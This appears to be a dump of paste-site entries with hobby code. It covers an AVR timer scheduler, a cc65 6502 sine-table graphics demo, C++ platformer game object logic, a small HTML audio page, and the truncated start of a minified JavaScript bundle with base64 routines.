            TIMSK2 &= ~(1 << OCIE2A);  // Disable Timer2 Compare Match A interrupt
            sleep_disable();

            delayMicroseconds(lostBits);

        } else {
            delayMicroseconds(timeToNextTask);
        }

        if (indexFonction != nullptr) {
            indexFonction->callback();
            indexFonction->lastRun = micros();
            // Fin de updateTask
        }
    }
}

ISR(TIMER2_COMPA_vect) {
    isrCounter--;
    if (isrCounter == 1) {
        TCCR2B &= ~(1 << CS22);  // Stop Timer
        OCR2A = remainingMicros;
        TCCR2B |= (1 << CS22);  // Start Timer
        sleep_cpu();
    } else if (isrCounter == 0) {
        TCCR2B &= ~(1 << CS22);  // Stop Timer
        TIMSK2 &= ~(1 << OCIE2A);  // Disable Timer2 Compare Match A interrupt
        sleep_disable();
    } else {
        sleep_cpu();
    }
}
"
3eBYfwdV,crappy cc65 demo for ezr6502,Kitomas,C,Friday 28th of June 2024 02:25:10 AM CDT,"//CC65 VERSION
#ifndef _EZR6502_MISC_H
#define _EZR6502_MISC_H



//naming convention notes that i may or may not follow:
//local variables      = lowerCamelCase
//global variables     = g_lowerCamelCase
//macros and constants = ALL_CAPS
//pointer variables    = p_XXXXXX
//non struct typedefs  = lowercase_t
//structs			         = UpperCamelCase
//enumurations         = UpperCamelCase
//c source functions   = UpperCamelCase
//asm source functions = lowerCamelCase
//enum members         = Capitalized or ALL_CAPS
//__asm__ format specifiers
//%b - Numerical 8-bit value
//%w - Numerical 16-bit value
//%l - Numerical 32-bit value
//%v - Assembler name of a global variable or function
//%o - Stack offset of a local variable
//%g - Assembler name of a C label
//%s - The argument is converted to a string
//%% - The % sign itself

//-- SEGMENTS --
//(Example: #pragma data_seg(Code))
//Zeropage   : $00  -> $fd  (virtual; $fe,$ff are reserved for rng and kb input)
//Stack      : $100 -> $1ff (virtual)
//VideoMemory: $200 -> $5ff (virtual)
//Code       : $600 -> $ffff



typedef        signed char s8;
typedef        signed int  s16;
typedef long   signed int  s32;
typedef      unsigned char u8;
typedef      unsigned int  u16;
typedef long unsigned int  u32;

typedef union r16 {
  u16 v;
  struct { u8 l, h; };
} r16;

#define  S8_MIN        -128
#define S16_MIN      -32768
#define S32_MIN -2147483648
#define  S8_MAX         127
#define S16_MAX       32767
#define S32_MAX  2147483647
#define  U8_MAX         255
#define U16_MAX       65535
#define U32_MAX  4294967295

#define MSb_8        0x80
#define MSb_16     0x8000
#define MSb_32 0x80000000



#define BITS_OFF8( var,bits) var &= (bits^0xff  )
#define BITS_OFF16(var,bits) var &= (bits^0xffff)
#define BITS_ON(   var,bits) var |=  bits;

#define TO_LOWER(chr) (c|( 0x20))
#define TO_UPPER(chr) (c&(~0x20))


//($80-$fd are reserved for compiler usage)
#define RANDOM (*((char*)0xfe))
#define KEY    (*((char*)0xff))

#define PIXELS ((char*)0x200)

#define DISABLE_BRK_PAUSE __asm__(""sei"")
#define ENABLE_BRK_PAUSE  __asm__(""cli"")
#define BREAK_POINT       __asm__(""brk"")
#define UPDATE_SCREEN     __asm__(""nop"")

//first 16 colors
#define COLOR_BLACK     0
#define COLOR_DRED      1
#define COLOR_DGREEN    2
#define COLOR_DYELLOW   3
#define COLOR_DBLUE     4
#define COLOR_DMAGENTA  5
#define COLOR_DCYAN     6
#define COLOR_LGRAY     7
#define COLOR_DGRAY     8
#define COLOR_LRED      9
#define COLOR_LGREEN   10
#define COLOR_LYELLOW  11
#define COLOR_LBLUE    12
#define COLOR_LMAGENTA 13
#define COLOR_LCYAN    14
#define COLOR_WHITE    15



char g_char0;
char g_char1;
char g_char2;



#endif /* _EZR6502_MISC_H */


//CC65 VERSION
//each increment is equal to exactly 1.40625 degrees (about 0.0245436926 radians)
//precision is about 1/255th (255 instead of 256 because -128 is not used)
#ifndef _SIN8S_H
#define _SIN8S_H



const signed char
#ifdef SIN8S_MIN //64-wide lookup table
#ifdef SIN8S_ALIGN
//__align(64)
#endif /* ifdef SIN8S_ALIGN */
_sin8s_table[64] =

#else //256-wide lookup table
#ifdef SIN8S_ALIGN
//__align(256)
#endif /* ifdef SIN8S_ALIGN */
_sin8s_table[256] =

#endif /* ifndef SIN8S_MIN */
{ //(effective range of -127 -> 127)
     0,    3,    6,    9,   12,   16,   19,   22,   25,   28,   31,   34,   37,   40,   43,   46,
    49,   51,   54,   57,   60,   63,   65,   68,   71,   73,   76,   78,   81,   83,   85,   88,
    90,   92,   94,   96,   98,  100,  102,  104,  106,  107,  109,  111,  112,  113,  115,  116,
   117,  118,  120,  121,  122,  122,  123,  124,  125,  125,  126,  126,  126,  127,  127,  127,
#ifndef SIN8S_MIN
//this is redundant if you make the output index 64-(<input index>&63) (result = 127 if <input index>&127 = 64)
   127,  127,  127,  127,  126,  126,  126,  125,  125,  124,  123,  122,  122,  121,  120,  118,
   117,  116,  115,  113,  112,  111,  109,  107,  106,  104,  102,  100,   98,   96,   94,   92,
    90,   88,   85,   83,   81,   78,   76,   73,   71,   68,   65,   63,   60,   57,   54,   51,
    49,   46,   43,   40,   37,   34,   31,   28,   25,   22,   19,   16,   12,    9,    6,    3,
//this is redundant if you just flip result if input index is > 127
     0,   -3,   -6,   -9,  -12,  -16,  -19,  -22,  -25,  -28,  -31,  -34,  -37,  -40,  -43,  -46,
   -49,  -51,  -54,  -57,  -60,  -63,  -65,  -68,  -71,  -73,  -76,  -78,  -81,  -83,  -85,  -88,
   -90,  -92,  -94,  -96,  -98, -100, -102, -104, -106, -107, -109, -111, -112, -113, -115, -116,
  -117, -118, -120, -121, -122, -122, -123, -124, -125, -125, -126, -126, -126, -127, -127, -127,
  -127, -127, -127, -127, -126, -126, -126, -125, -125, -124, -123, -122, -122, -121, -120, -118,
  -117, -116, -115, -113, -112, -111, -109, -107, -106, -104, -102, -100,  -98,  -96,  -94,  -92,
   -90,  -88,  -85,  -83,  -81,  -78,  -76,  -73,  -71,  -68,  -65,  -63,  -60,  -57,  -54,  -51,
   -49,  -46,  -43,  -40,  -37,  -34,  -31,  -28,  -25,  -22,  -19,  -16,  -12,   -9,   -6,   -3,
#endif /* ifndef SIN8S_MIN */
};


extern char g_char0;


#ifdef SIN8S_INLINE
inline
#endif /* ifdef SIN8S_INLINE */
signed char __fastcall__ sin8s(const char x){
  g_char0 = x;
  
#ifdef SIN8S_MIN //slower, but takes up less space (lookup table included)
  __asm__(""lda %v"", g_char0);
  __asm__(""tay"");      //store original value of a in y
  __asm__(""and #127""); //a %= 128
  

  //a = 0-63: index = a
  __asm__(""cmp #64"");               //branch if a<64
  __asm__(""bcc %g"", _index_result);  //^^

  //a = 65-127: index = 64-(a%64)
  __asm__(""cmp #65"");             //branch if a<65
  __asm__(""bcc %g"", _not_65_127);  //^^
    __asm__(""and #63"");         //a %= 64
    __asm__(""sta %v"", g_char0); //tmp = a
    __asm__(""lda #64"");         //a = 64
    __asm__(""sec"");             //a -= tmp
    __asm__(""sbc %v"", g_char0);  //^^
    __asm__(""jmp %g"", _index_result);
  _not_65_127:

  //result will either be 127 or -127
   //if input was 64 or 192 respectively
  __asm__(""lda #127"");
  __asm__(""jmp %g"", _dont_index_result);
  

  _index_result:
  __asm__(""tax""    );                //put index into x
  __asm__(""lda %v,x"", _sin8s_table); //get result
  _dont_index_result:
  
  
  __asm__(""tax"");                  //store result into x
  __asm__(""tya"");                  //branch if input was positive
  __asm__(""bpl %g"", _not_negative); //^^
    __asm__(""txa"");      //get result back
    __asm__(""eor #$ff""); //result = -result (if input was negative)
    __asm__(""clc"");       //^^
    __asm__(""adc #1"");    //^^
    __asm__(""tax"");      //store new result in x
  _not_negative:
  
  //put (potentially altered) result into return variable
  __asm__(""stx %v"", g_char0);


#else
  //faster, but takes up more space (lookup table included)
  __asm__(""ldx %v"", g_char0);
  __asm__(""lda %v,x"", _sin8s_table);
  __asm__(""sta %v"", g_char0);


#endif /* ifdef SIN8S_MIN */
  return g_char0;
}

#define cos8s(_v) (sin8s((_v)+64))





#endif /* ifndef _SIN8S_H */





s8 abs8(s8 n){ return (n<0) ? -n : n; }

u8 getgray_u(u8 n){ return 232+n/11; }
u8 getgray_s(s8 n){ return 232+abs8(n)/6; }

/*
s8 shift_s8r(s8 n, u8 s){
  s8 _n = n>>s;
  //bit extend if negative
  if(n<0) return (0xff<<(8-s)) | _n;
  else    return _n;
}
*/
#define shift_s8r(_n,_s) ( ((_n)<0) ? (0xff<<(8-(_s)))|(_n>>(_s)) : (_n>>(_s)) )


/*
void putpixel(s8 p_x, s8 p_y, u8 color){
  if((p_x&0b11100000) || (p_y&0b11100000)) return;
  PIXELS[p_x | ((int)p_y)<<5] = color;
}
*/
#define putpixel(p_x, p_y, color) PIXELS[p_x | ((int)p_y)<<5] = color



s8 min(s8 a, s8 b){ return (a< b) ? a : b; }
s8 max(s8 a, s8 b){ return (a>=b) ? a : b; }

s8 edge_start[32];
s8 edge_end  [32];
s8 edge_mod  [32];
s8 grayscale[256];


void main(){
/*
  s8 p_x0, p_x1, p_x, p_y;
  s8 i0, i1, color;
  s8 shift = 0;
  _START:
  i0 = -65,  i1 = -64;

  do {
    p_x0 = 16 + shift_s8r(cos8s(i0), 3);
    p_x1 = 16 + shift_s8r(cos8s(i1), 3);
    p_y  = 16 + shift_s8r(sin8s(i1), 3);
    
    for(p_x = p_x0; p_x <= p_x1; ++p_x){
      color = getgray_s(cos8s(i1+(shift+=3)));
      putpixel(p_x, p_y, color);
    }
    
    
    --i0;
  } while(++i1 != 51);
  

  UPDATE_SCREEN;
  BREAK_POINT;
  goto _START;
*/

  u16 addr;
  s8 p_x0, p_x1, p_x, p_y;
  s8 i0, i1, color;
  s8 shift = 0;
  //_INIT:
  i0 = -65,  i1 = -64;

  do {
    p_x0 = 16 + shift_s8r(cos8s(i0), 3);
    p_x1 = 16 + shift_s8r(cos8s(i1), 3);
    p_y  = 16 + shift_s8r(sin8s(i1), 3);
    
    edge_start[p_y] = min(p_x0  , p_x1  );
    edge_end  [p_y] = max(p_x0+1, p_x1+1);
    edge_mod  [p_y] = i1;
    //(+1 so i can use < when looping through x)
    
    --i0;
  } while(++i1 != 51);
  
  
  
  //generate grayscale lookup
  i0 = 0;
  do {
    //grayscale[i0] = 16+i0/43;//getgray_s(i0);
    grayscale[i0] = getgray_s(i0);
  } while(++i0);
  
  
  
  
  _START:
  i1 = -64;
  p_y = 0;
  _LOOPY:
  
  
  p_x0 = edge_start[p_y];
  p_x1 = edge_end  [p_y];
  addr = p_x0 | ((u16)p_y)<<5;
  for(p_x = p_x0; p_x <= p_x1; ++p_x){
    color = grayscale[ sin8s(i1+(shift+=5)) ];
    PIXELS[addr] = color;
    ++addr;
  }
  ++i1;
  
  if(++p_y != 32) goto _LOOPY;

  UPDATE_SCREEN;
  //BREAK_POINT;
  goto _START;
}
"
8Yy2rEM5,(most of the) work for 2024-06-28,Kitomas,C++,Friday 28th of June 2024 02:21:28 AM CDT,"void handleEdgeWrap(){
  if(!gl_scene.scene)
    throw ""gl_scene.scene == 0 (loadScene(>0) before calling handleEdgeWrap()!)"";

  u16  new_scene_id     = 0;
  bool call_loadObjects = false;


  if(       gl_player.pos.x < 0        ){ //player went past west side
    gl_player.pos.x  = CANVSIZ_X;
    new_scene_id     = CURRENT_SCENE_PTR->edge_w;
    call_loadObjects = true;

  } else if(gl_player.pos.x > CANVSIZ_X){ //player went past east side
    gl_player.pos.x = 0;
    new_scene_id     = CURRENT_SCENE_PTR->edge_e;
    call_loadObjects = true;

  }/* else if(gl_player.pos.y < 0        ){ //player went past north side
    gl_player.pos.y  = CANVSIZ_Y;
    new_scene_id     = CURRENT_SCENE_PTR->edge_n;
    call_loadObjects = true;

  } else if(gl_player.pos.y > CANVSIZ_Y){ //player went past south side
    gl_player.pos.y  = 0;
    new_scene_id     = CURRENT_SCENE_PTR->edge_s;
    call_loadObjects = true;

  }*/ //tbd: uncomment this when i start to use north and south edges


  if(new_scene_id    ) loadScene(new_scene_id);
  if(call_loadObjects) loadObjects();

}





#define INDICATOR_SPACING 2
static inline void drawAbilityIndicators(){
  shape::rect dst(INDICATOR_SPACING,INDICATOR_SPACING, 10,10);
  shape::rect src(0,0, 10,10);

  //shrink
  if(gl_player.has_shrink){
    //src.x = 0;
    gl_spritesheetAbilityIndicators->blitRect(&dst, &src, 0xff00ff);
    dst.x += 10+INDICATOR_SPACING;
  }

  //double jump
  if(gl_player.has_dbljmp){
    src.x = 10;
    gl_spritesheetAbilityIndicators->blitRect(&dst, &src, 0xff00ff);
    dst.x += 10+INDICATOR_SPACING;
  }

  //speed
  if(gl_player.has_speed){
    src.x = 20;
    gl_spritesheetAbilityIndicators->blitRect(&dst, &src, 0xff00ff);
    //dst.x += 10+INDICATOR_SPACING;
  }

}

void drawStuff_and_processObjects(){
  bool ro_back = false; //r[ender]o[only] objects that are !in_front
  bool ro_frnt = false; //same thing but only ones with in_front set instead

  //I Can't Believe It's Not Assembly!
/*_clear_gray :*/ gl_win->clear(0x808080);
  _draw_bg    :   gl_scene.drawBg();
/*_draw_mg    :*/ gl_scene.drawTiles(false);
/*_proc_obj_bk:*/ if(processObjects(false,ro_back)){ ro_back=true; goto _draw_bg; }
/*_draw_player:*/ gl_player.blit();
/*_draw_fg    :*/ gl_scene.drawTiles(true);
/*_proc_obj_fr:*/ if(processObjects(true ,ro_frnt)){ ro_back=ro_frnt=true; goto _draw_bg; }
/*_draw_ablity:*/ drawAbilityIndicators();

}





//unit should be between 0.0f and 1.0f
color::ARGB unit_to_ryg(f32 unit){
  unit = CLAMP(unit*2, 0.0f, 2.0f);
  u8 red = 255,  green = 255;

  #define _RND(_v) (  (u8)( (_v)+0.5f )  )
  if(unit < 1.0f) green = _RND(255.0f*(     unit));
  else            red   = _RND(255.0f*(2.0f-unit));
  #undef _RND

  return color::ARGB(red, green, 0, 0);

}





//assumes 8x8 monospaced with 1 pixel of spacing in both x and y
shape::point get_text_size(const char* str){
  if(!str) throw ""nullptr string was passed to get_text_size()"";
  shape::point result(0,9);
  s32 current_width = 0;

  for(; *str != 0; ++str){
    if(*str != '\n'){
      current_width += 9;
    } else {
      result.x  = MAX(result.x, current_width);
      result.y += 9;
      current_width = 0;
    }
  }

  result.x = MAX(result.x, current_width);
  if(!result.x) result.y = 0;

  return result;

}



//x&y determine the CENTER position of the text, not its top-left corner
//calculates text_size if either text_size.x or .y is 0
void drawTextBox(s32 x, s32 y, const char* str, shape::point text_size){
  if(!str) throw ""nullptr string was passed to drawTextBox()"";
  shape::rect box_rect(x,y, 0,0);

  if(!text_size.x || !text_size.y) text_size = get_text_size(str);

  box_rect.w  = text_size.x+2;
  box_rect.h  = text_size.y+2;
  box_rect.x -= box_rect.w/2;
  box_rect.y -= box_rect.h/2;

  gl_win->drawRectangles(&box_rect, 1, 0x000000);
  gl_win_drawRectEmpty(box_rect, 0x808080);
  gl_text->print(box_rect.x+2, box_rect.y+2, str);

}





#include <object.hpp>
#include <player.hpp>
#include <tile.hpp>

using namespace kit;

#define GET_OBJ(_type) _type* obj = (_type*)_obj_a
#define GET_DST(_obj_ptr) { _obj_ptr->x, _obj_ptr->y, _obj_ptr->size.x, _obj_ptr->size.y }


#define OBJIMG(_index) gl_objImg[_index]

#define OBJIMG_LEVER_WALL      OBJIMG(1)
#define OBJIMG_ABILITY_SHRINK  OBJIMG(2)
#define OBJIMG_ABILITY_DBLJMP  OBJIMG(3)
#define OBJIMG_ABILITY_SPEED   OBJIMG(4)
#define OBJIMG_ABILITY_REMOVER OBJIMG(5)
#define OBJIMG_SIGNPOST_WOOD   OBJIMG(6)

#define TXTLINE(_index) gl_text_lines[_index]





//copy original state of object data to the active scene
void loadObjects(bool forced, u16 scene_id){
  if(!scene_id && !gl_scene.scene)
    throw ""gl_scene.scene == 0 (loadScene(>0) before calling loadObjects()!)"";
  if(!scene_id) scene_id = gl_scene.scene;
  if(scene_id > gl_scenes_len) throw ""scene_id > gl_scenes_len"";

  SceneDescriptor* scene_current = gl_scenes[scene_id];

  Object* objsCache = gl_objsCache[scene_id];
  Object* objs      = scene_current->objs;
  u16     objs_len  = scene_current->objs_len;


  if(!forced){ //only copy object data whose persistence flag is false
    for(u32 i=0; i<objs_len; ++i){
      if(!objsCache[i].persistent) objsCache[i] = objs[i];
    }

  } else { //otherwise, copy all objects in scene
    for(u32 i=0; i<objs_len; ++i){
      objsCache[i] = objs[i];
    }

  }

}




#define CHECK_TYPE_NULL 0
bool processObjects(bool in_front, bool render_only){
  bool scene_changed = false;

  Object* objs      = gl_objsCache[gl_scene.scene];
  u16     objs_len  = gl_scenes[gl_scene.scene]->objs_len;
  Object* obj;



  #if CHECK_TYPE_NULL == 1
    #define TYPE_CHECK  && obj->type != 0
  #else
    #define TYPE_CHECK
  #endif

  if(!in_front){
    for(u32 i=0; i<objs_len; ++i){
      obj = &objs[i];
      if(!obj->in_front /*&&*/ TYPE_CHECK)
        scene_changed |= obj->update(obj, render_only);

    }


  } else {
    for(u32 i=0; i<objs_len; ++i){
      obj = &objs[i];
      if(obj->in_front /*&&*/ TYPE_CHECK)
        scene_changed |= obj->update(obj, render_only);

    }

  }

  #undef TYPE_CHECK



  if(!render_only) return scene_changed;
  else             return false;

}





//do not use this object in a scene with more than 2 states
//also, there can in theory be multiple 1lever(s) in a scene,
 //as long as they share the same values of scene_old&new
struct _obj_1lever { //24B; 8x24px sprite
  u16        scene_old; //2B
  u16        scene_new; //2B
  u16           sfx_id; //2B
  //-END OF INIT DATA-
  bool            init; //1B
  bool         flipped; //1B
  Bitmap*          img; //8B
  SoundEffect*     sfx; //8B
};

bool obj_1lever(Object* _obj_a, bool render_only){
  GET_OBJ(_obj_1lever); //obj = _obj_a

  shape::rect rect_dst = GET_DST(_obj_a);
  shape::rect rect_src(0,0, 8,24);
  bool scene_changed = false;


  if(!obj->init){
    _obj_a->persistent = 1; //this object is always persistent

    obj->init    =  true;
    obj->flipped = false;
    obj->img     = OBJIMG_LEVER_WALL;


    if(!obj->sfx_id){ //use default sound effect
      obj->sfx = SFXPTR_ACTIVATE_1;

    } else if(obj->sfx_id <= gl_sfx_len){ //use specified sound effect
      obj->sfx = SFXPTR(obj->sfx_id);

    } else { //no sound effect found
      obj->sfx = nullptr;
      //tbd: warn about nonexistent sound effect

    }


  }



  //if player is touching the object
  if(rects_overlapping(gl_player.getRect(), rect_dst)){
    rect_src.y = 24; //highlighted
    //if player activates the lever
    if(!render_only && CTRLSTATE_GET(down_p)){
      swapScene(obj->scene_old, obj->scene_new);
      obj->flipped ^= 1;
      scene_changed = true;
      SFXPTR_PLAY(obj->sfx);
    }

  }

  if(obj->flipped) rect_src.x = 8; //lever points down


  if(obj->img) obj->img->blitRect(&rect_dst, &rect_src, 0xff00ff);

  return scene_changed;

}





//0 = shrink
//1 = double jump
//2 = speed
struct _obj_ability { //24B; 24x24px sprite, 24 frames (spritesheet of 24x1)
  u8          which; //1B
  //-END OF INIT DATA-
  bool         init; //1B
  u16  frameCounter; //2B
  u32    _padding32; //4B
  Bitmap*       img; //8B
  bool* has_ability; //8B; ptr to bool that determines if ability is enabled
};

bool obj_ability(Object* _obj_a, bool render_only){
  GET_OBJ(_obj_ability); //obj = _obj_a

  shape::rect rect_dst = GET_DST(_obj_a);
  shape::rect rect_src(0,0, 24,24);


  if(!obj->init){
    _obj_a->persistent = 1; //this object is always persistent

    obj->init         = true;
    obj->frameCounter = 23; //will roll over to 0 this iteration

    //this implementation is quite strange but whatever it works like a charm
    switch(obj->which){
      case 0 : obj->img         = OBJIMG_ABILITY_SHRINK;
               obj->has_ability = &gl_player.has_shrink; break;

      case 1 : obj->img         = OBJIMG_ABILITY_DBLJMP;
               obj->has_ability = &gl_player.has_dbljmp; break;

      case 2 : obj->img         = OBJIMG_ABILITY_SPEED;
               obj->has_ability = &gl_player.has_speed;  break;

      default: obj->img         = gl_tileset_missing;
               obj->has_ability = nullptr;

    }

  }



  //if player is touching the object (and everything else is valid)
  if(!render_only) //&&
  if(obj->has_ability != nullptr  &&  !(*obj->has_ability)  &&
     rects_overlapping(gl_player.getRect(), rect_dst))
  {
    *obj->has_ability = true;
    SFXPTR_PLAY(SFXPTR_ABILITY_PICKUP);

  }



  //pick which frame in the animation to use
  if(obj->has_ability != nullptr){
    //increment animation's frame counter every 13 ticks, which makes for ~9.2fps
    if(!(gl_tickCounter%13)) obj->frameCounter = (obj->frameCounter+1)%24;

    rect_src.x = 24 * obj->frameCounter;
    if(*obj->has_ability) rect_src.y = 24; //otherwise it'll remain 0

  }


  //if the has_ability pointer is invalid, disable magenta transparency, since
   //the 'missing tile' bitmap uses the color magenta
  color::ARGB t_color = (obj->has_ability != nullptr) ? 0xff00ff : 0x80000000;

  if(obj->img) obj->img->blitRect(&rect_dst, &rect_src, t_color);

  return false;

}





//0 = shrink
//1 = double jump
//2 = speed
struct _obj_ability_remover { //24B; 24x24px sprite, spritesheet of 3x1
  u8          which; //1B
  bool    dontReset; //1B; disables resetting player scale back to 2 if .which == 0, etc.
  //-END OF INIT DATA-
  bool         init; //1B
  u8      _padding8; //1B
  u32    _padding32; //4B
  Bitmap*       img; //8B
  bool* has_ability; //8B; ptr to bool that determines if ability is enabled
};

bool obj_ability_remover(Object* _obj_a, bool render_only){
  GET_OBJ(_obj_ability_remover); //obj = _obj_a

  shape::rect rect_dst = GET_DST(_obj_a);
  shape::rect rect_src(24*obj->which,0, 24,24);


  if(!obj->init){
    _obj_a->persistent = 1; //this object is always persistent

    obj->init = true;

    obj->img = OBJIMG_ABILITY_REMOVER;
    if(!obj->img) obj->img = gl_tileset_missing; //this shouldn't happen ever

    switch(obj->which){
      case 0 : obj->has_ability = &gl_player.has_shrink; break;
      case 1 : obj->has_ability = &gl_player.has_dbljmp; break;
      case 2 : obj->has_ability = &gl_player.has_speed;  break;
      default: obj->has_ability = nullptr;

    }

  }



  //if player is touching the object (and everything else is valid)
  if(!render_only) //&&
  if(obj->has_ability != nullptr  &&  (*obj->has_ability)  &&
     rects_overlapping(gl_player.getRect(), rect_dst))
  {
    *obj->has_ability = false;
    SFXPTR_PLAY(SFXPTR_ABILITY_REMOVED);

    if(!obj->dontReset)
    switch(obj->which){
      //(case 0 should only fail if i place this object in a subtile-wide space)
      case 0 : gl_player.setScale(2.0f);       break;
    //case 1 : //(not used)
      case 2 : gl_player.enforceMaxVel = true; break;
      default:;

    }

  }



  //if the has_ability pointer is invalid, disable magenta transparency, since
   //the 'missing tile' bitmap uses the color magenta
  color::ARGB t_color = (obj->has_ability != nullptr) ? 0xff00ff : 0x80000000;

  if(obj->img) obj->img->blitRect(&rect_dst, &rect_src, t_color);

  return false;

}





//(not specifying w or h results in the default of _obj_a->size.x/y being used!)
struct _obj_generic_sprite { //16B
  u16       which; //2B; objimg index
  u8          w,h; //2B; width and height of source sprite (1B each)
  u8    numFrames; //1B; <2 for no animation (static sprite)
  u8   tick_delay; //1B; 'how many ticks per frame?' (ignored if num_frames < 2)
  //-END OF INIT DATA-
  bool       init; //1B
  u8 frameCounter; //1B
  Bitmap*     img; //8B
};

bool obj_generic_sprite(Object* _obj_a, bool render_only){
  GET_OBJ(_obj_generic_sprite); //obj = _obj_a

  shape::rect rect_dst = GET_DST(_obj_a);
  shape::rect rect_src(0,0, obj->w,obj->h);


  if(!obj->init){
    _obj_a->persistent = 1; //this object is always persistent

    obj->init         = true;
    obj->frameCounter = obj->numFrames-1; //will roll over to 0 this iteration

    if(obj->which <= gl_objImg_len) obj->img = OBJIMG(obj->which);
    if(!obj->img){
      //if i somehow have more than 65k object images,
       //i have bigger problems to worry about
      obj->which = KIT_U16_MAX;
      obj->img   = gl_tileset_missing;
    }


    //if w/h are 0, then default the src size to the dst size
    if(!obj->w){
      obj->w = (u8)_obj_a->size.x;
      rect_src.w = obj->w;
    }

    if(!obj->h){
      obj->h = (u8)_obj_a->size.y;
      rect_src.h = obj->h;
    }

  }



  //pick which frame in the animation to use
  if(obj->numFrames > 1){
    //increment animation's frame counter every tick_delay ticks
    if(!(gl_tickCounter%obj->tick_delay))
      obj->frameCounter = (obj->frameCounter+1)%obj->numFrames;

    //(which horizontal slot in the spritesheet to use, technically)
    rect_src.x = rect_src.w * obj->frameCounter;

  }


  color::ARGB t_color = (obj->which != KIT_U16_MAX) ? 0xff00ff : 0x80000000;

  if(obj->img) obj->img->blitRect(&rect_dst, &rect_src, t_color);


  return false;

}





struct _obj_msgbox { //24B
  s16      pos_x, pos_y; //4B (2B each)
  u16             which; //2B; gl_text_lines index
  bool      show_always; //1B; always display box, instead of on player collide
  //-END OF INIT DATA-
  bool             init; //1B
  shape::point str_size; //8B
  const char*       str; //8B
};

bool obj_msgbox(Object* _obj_a, bool render_only){
  GET_OBJ(_obj_msgbox); //obj = _obj_a

  shape::rect rect_collider = GET_DST(_obj_a);

  if(!obj->init){
    _obj_a->persistent = 1; //this object is always persistent

    obj->init = true;

    if(obj->which <= gl_text_lines_len) obj->str = TXTLINE(obj->which);
    if(!obj->str) obj->str = TXTLINE(0); // = ""<INVALID TEXT ID>""

    obj->str_size = get_text_size(obj->str);

  }


  if(obj->show_always ||
     rects_overlapping(gl_player.getRect(), rect_collider))
  {
    drawTextBox(obj->pos_x, obj->pos_y, obj->str, obj->str_size);
  }


  return false;

}





#ifndef TEXT_LINES_DEFINITION
extern size_t gl_text_lines_len;
extern const char* gl_text_lines[];


#else
size_t gl_text_lines_len;
const char* gl_text_lines[] = {
/*0*/ ""\
<INVALID TEXT ID>"",

/*1*/ ""\
this is some pretty cool text! :D"",


//(this must be here in order for the length
 //of this array to be properly calculated!)
nullptr,

};


#endif /* TEXT_LINES_DEFINITION */"
bf1RWTv9,Audio Fade Out,1xptolevitico69,HTML,Friday 28th of June 2024 12:16:05 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
   <head>
      <meta charset=""UTF-8"" />
      <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"" />
      <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
      <style>


         body {
            margin: 0;
         }

         * {
            box-sizing: border-box;
            font-family: arial black;
         }

         .top {
            width: 100%;
            height: 100vh;
            border: 0;
            outline: 0;
            background-color: white;
         }

         .top a {
            display: block;
            color: red;
            margin: 0 5px;
            text-decoration: none;
            font-weight: 900;
            font-size: 25px;
         }

         .top input {
            display: inline-block;
            margin: 3px;
         }

         h1 {
            margin: 30px 0;
         }

         .search {
            outline: 3px solid red;
            font-size: 20px;
            width: 150px;
            text-align: center;
            border: 2px solid white;
            color: red;
            background-color: red;
            color: white;
         }

         @media (orientation: portrait) and (max-width:425px){
            .top input {
               display: block;
               margin: 9px auto;
            }

            h1 {
               font-size: 20px;
            }
         }

         @media (orientation: landscape) and (max-width: 640px) {
            h1 {
               font-size: 20px;
            }

            .avatar {
               margin: auto;
            }
         }
      </style>
   </head>

   <body>
      <audio id=""audio"" loop src=""https://1xpto.netlify.app/audio/trance.mp3""></audio>

      <button class=""top"">
         <a href=""https://1xpto.netlify.app/"">Home</a>
         <a href=""https://www.facebook.com/ManuelJSAndrade/"">Facebook</a>

         <h1>AUDIO FADE OUT</h1>

         <input class=""search"" onclick=""Style()"" type=""button"" value=""Src Code"" />
         <input class=""search"" onclick=""web()"" type=""button"" value=""HTML"" />
      </button>

      <script>
         function Style() {
            audio.play();
            foo = window.open(""https://1xpto.netlify.app/articles/audio%20fade%20out/local/index.txt"");
         }

         function web() {
            audio.pause();
            window.open(""https://1xpto.netlify.app/articles/audio%20fade%20out/local/"", ""_self"");
            foo.close();
         }
      </script>
   </body>
</html>"
UV2Ttb63,Untitled,LissaBeth1978,JavaScript,Friday 28th of June 2024 12:11:26 AM CDT,"/*! For license information please see Bletchley.js.LICENSE.txt */
(()=>{var e={87757:(e,t,r)=>{e.exports=r(35666)},79742:(e,t)=>{""use strict"";t.byteLength=function(e){var t=u(e),r=t[0],n=t[1];return 3*(r+n)/4-n},t.toByteArray=function(e){var t,r,i=u(e),a=i[0],s=i[1],c=new o(function(e,t,r){return 3*(t+r)/4-r}(0,a,s)),l=0,f=s>0?a-4:a;for(r=0;r<f;r+=4)t=n[e.charCodeAt(r)]<<18|n[e.charCodeAt(r+1)]<<12|n[e.charCodeAt(r+2)]<<6|n[e.charCodeAt(r+3)],c[l++]=t>>16&255,c[l++]=t>>8&255,c[l++]=255&t;return 2===s&&(t=n[e.charCodeAt(r)]<<2|n[e.charCodeAt(r+1)]>>4,c[l++]=255&t),1===s&&(t=n[e.charCodeAt(r)]<<10|n[e.charCodeAt(r+1)]<<4|n[e.charCodeAt(r+2)]>>2,c[l++]=t>>8&255,c[l++]=255&t),c},t.fromByteArray=function(e){for(var t,n=e.length,o=n%3,i=[],a=16383,s=0,u=n-o;s<u;s+=a)i.push(c(e,s,s+a>u?u:s+a));return 1===o?(t=e[n-1],i.push(r[t>>2]+r[t<<4&63]+""=="")):2===o&&(t=(e[n-2]<<8)+e[n-1],i.push(r[t>>10]+r[t>>4&63]+r[t<<2&63]+""="")),i.join("""")};for(var r=[],n=[],o=""undefined""!=typeof Uint8Array?Uint8Array:Array,i=""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"",a=0,s=i.length;a<s;++a)r[a]=i[a],n[i.charCodeAt(a)]=a;function u(e){var t=e.length;if(t%4>0)throw new Error(""Invalid string. Length must be a multiple of 4"");var r=e.indexOf(""="");return-1===r&&(r=t),[r,r===t?0:4-r%4]}function c(e,t,n){for(var o,i,a=[],s=t;s<n;s+=3)o=(e[s]<<16&16711680)+(e[s+1]<<8&65280)+(255&e[s+2]),a.push(r[(i=o)>>18&63]+r[i>>12&63]+r[i>>6&63]+r[63&i]);return a.join("""")}n[""-"".charCodeAt(0)]=62,n[""_"".charCodeAt(0)]=63},44431:function(e,t,r){var n;!function(o){""use strict"";var 